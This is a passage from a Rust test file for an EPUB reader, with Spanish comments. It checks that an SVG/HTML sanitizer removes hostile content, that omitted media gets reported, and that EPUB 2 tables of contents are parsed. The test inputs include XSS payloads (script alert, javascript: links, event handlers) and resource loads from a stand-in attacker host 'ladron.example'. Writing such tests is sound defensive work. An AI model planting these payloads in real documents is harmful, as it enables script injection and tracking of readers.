            r#"<svg><script>alert(1)</script><circle r="4"/></svg>"#,
            &["<script", "alert"],
        ),
        (
            "HTML dentro del dibujo",
            r#"<svg><foreignObject width="10" height="10"><p onclick="x()">ajeno</p><img src="https://ladron.example/p.png"/></foreignObject><circle r="4"/></svg>"#,
            &["foreignobject", "ajeno", "ladron.example", "onclick"],
        ),
        (
            "una animación que reescribe un enlace",
            r#"<svg><a href="c2.xhtml"><set attributeName="href" to="javascript:alert(1)"/><animate attributeName="href" values="javascript:alert(1)"/><circle r="4"/></a></svg>"#,
            &["<set", "<animate", "javascript:"],
        ),
        (
            "un manejador de eventos",
            r#"<svg onload="alert(1)"><circle r="4" onmouseover="robar()"/></svg>"#,
            &["onload", "onmouseover", "robar"],
        ),
        (
            "una hoja de estilo o un estilo en línea",
            r#"<svg><style>@import url(https://ladron.example/x.css)</style><circle r="4" style="fill:url(https://ladron.example/f.svg#p)"/></svg>"#,
            &["<style", "@import", "style=", "ladron.example"],
        ),
        (
            "un relleno que sale a buscarse fuera",
            r#"<svg><rect width="4" height="4" fill="url(https://ladron.example/f.svg#p)" stroke="url( 'data:image/svg+xml,x' )"/></svg>"#,
            &["ladron.example", "data:", "fill=", "stroke="],
        ),
        (
            "una imagen de otro servidor o en línea",
            r#"<svg><image href="https://ladron.example/p.png"/><image xlink:href="data:image/png;base64,AAAA"/></svg>"#,
            &["ladron.example", "data:"],
        ),
        (
            "un use que trae el dibujo de otro archivo",
            r#"<svg><use href="otro.svg#icono"/><use xlink:href="https://ladron.example/s.svg#i"/></svg>"#,
            &["otro.svg", "ladron.example"],
        ),
        (
            "un filtro, que puede cargar una imagen",
            r#"<svg><filter id="f"><feImage href="https://ladron.example/x.png"/></filter><circle r="4" filter="url(#f)"/></svg>"#,
            &["<filter", "feimage", "ladron.example", "filter="],
        ),
        (
            "un enlace a código",
            r#"<svg><a xlink:href="javascript:alert(1)"><circle r="4"/></a></svg>"#,
            &["javascript:"],
        ),
    ];

    for (que, hostil, prohibidos) in casos {
        let saneado = sanitize(hostil).expect("saneable");
        let html = saneado.html.to_lowercase();
        for prohibido in *prohibidos {
            assert!(
                !html.contains(prohibido),
                "{que}: quedó {prohibido}:\n{html}"
            );
        }
        // Y lo legítimo sigue, que es la otra mitad de un subconjunto acotado.
        assert!(html.contains("<svg"), "{que}: se perdió el dibujo:\n{html}");
    }
}

/// Un `use` que apunta a este mismo documento sí pasa: es como se repite un
/// símbolo, y quitarlo rompería dibujos legítimos.
#[test]
fn un_use_de_este_mismo_documento_se_conserva() {
    let saneado = sanitize(
        r##"<svg><defs><symbol id="hoja"><path d="M0,0 L4,4"/></symbol></defs><use href="#hoja" x="2"/></svg>"##,
    )
    .expect("saneable");
    assert!(
        saneado.html.contains(r##"<use href="#hoja" x="2"/>"##),
        "{}",
        saneado.html
    );
}

/// **Lo que no se pinta, se dice**. Un
/// vídeo o un formulario de un libro de ejercicios no caben en el lector, pero
/// quitarlos sin decirlo deja un hueco que parece un defecto del libro.
#[test]
fn lo_que_el_capitulo_trae_y_no_se_pinta_viaja_con_lo_que_se_pinta() {
    let tmp = Temporal::nuevo("omitido");
    let capitulo = r#"<p>Mira el experimento:</p>
        <video src="experimento.mp4" controls="controls"><p>Tu lector no reproduce vídeo.</p></video>
        <audio src="entrevista.mp3"/>
        <form action="enviar"><input type="text" name="respuesta"/><button>Enviar</button></form>
        <iframe src="https://ejemplo.org/"></iframe>
        <script>alert(1)</script>
        <p>Y apunta lo que veas.</p>"#;
    let registro = {
        let mut r = ProviderRegistry::new();
        r.register(Box::new(EpubFactory::solo_texto()));
        r
    };
    let libro = epub(&tmp, "omitido.epub", &[("c1.xhtml", capitulo)]);
    let doc = registro.open(MEDIA_TYPE, &libro).expect("abierto");
    let pintado = doc
        .render(&NativePosition::Fragment {
            href: "OEBPS/c1.xhtml".to_owned(),
            offset: 0,
        })
        .expect("pintado");
    let Rendered::Markup { omitted, .. } = pintado else {
        panic!("un EPUB se pinta como marcado");
    };
    use nb_books_lib::reader::sanitize::OmittedContent;
    assert_eq!(
        omitted,
        vec![
            OmittedContent::Audio,
            OmittedContent::Video,
            OmittedContent::Embedded,
            OmittedContent::Form
        ],
        "cada clase una vez, y el script no: no es contenido que alguien eche en falta"
    );
}

#[test]
fn un_capitulo_sin_nada_que_decir_no_dice_nada() {
    let saneado = sanitize(&fixture("formula.xhtml")).expect("saneable");
    assert!(saneado.report.omitted.is_empty());
    let saneado = sanitize("<p>Hola</p><script>x</script><style>p{}</style>").expect("saneable");
    assert!(
        saneado.report.omitted.is_empty(),
        "{:?}",
        saneado.report.omitted
    );
}

/// **Un EPUB 2 enseña su índice, con su jerarquía**.
///
/// Antes solo se leía el `nav` de EPUB 3, aunque el comentario
/// decía otra cosa, y un EPUB 2 caía a "Sección 1…N". Es casi todo el corpus de
/// epublibre: Hamlet enseñaba veintisiete "Sección".
#[test]
fn un_epub_2_ensena_su_indice_con_jerarquia() {
    let tmp = Temporal::nuevo("ncx");
    let ncx = r#"<?xml version="1.0"?><ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
      <navMap>
        <navPoint id="a1"><navLabel><text>Primer acto</text></navLabel><content src="c1.xhtml"/>
          <navPoint id="e1"><navLabel><text>Escena I</text></navLabel><content src="c1.xhtml#e1"/></navPoint>
          <navPoint id="e2"><navLabel><text>  Escena
            II </text></navLabel><content src="c2.xhtml"/></navPoint>
        </navPoint>
      </navMap></ncx>"#;
    let ruta = epub_con(
        &tmp,
        "dos.epub",
        &[("c1.xhtml", "<p>Uno</p>"), ("c2.xhtml", "<p>Dos</p>")],
        &[("toc.ncx", "application/x-dtbncx+xml", ncx)],
    );
    let documento = EpubDocument::open(&ruta).expect("abre");
    let indice = documento.navigation().expect("índice").entries;
    assert_eq!(indice.len(), 1);
    assert_eq!(indice[0].title, "Primer acto");
    let hijos: Vec<_> = indice[0]
        .children
        .iter()
        .map(|e| e.title.as_str())
        .collect();
    assert_eq!(hijos, ["Escena I", "Escena II"]);
    assert_eq!(indice[0].children[1].locator.href, "OEBPS/c2.xhtml");
}
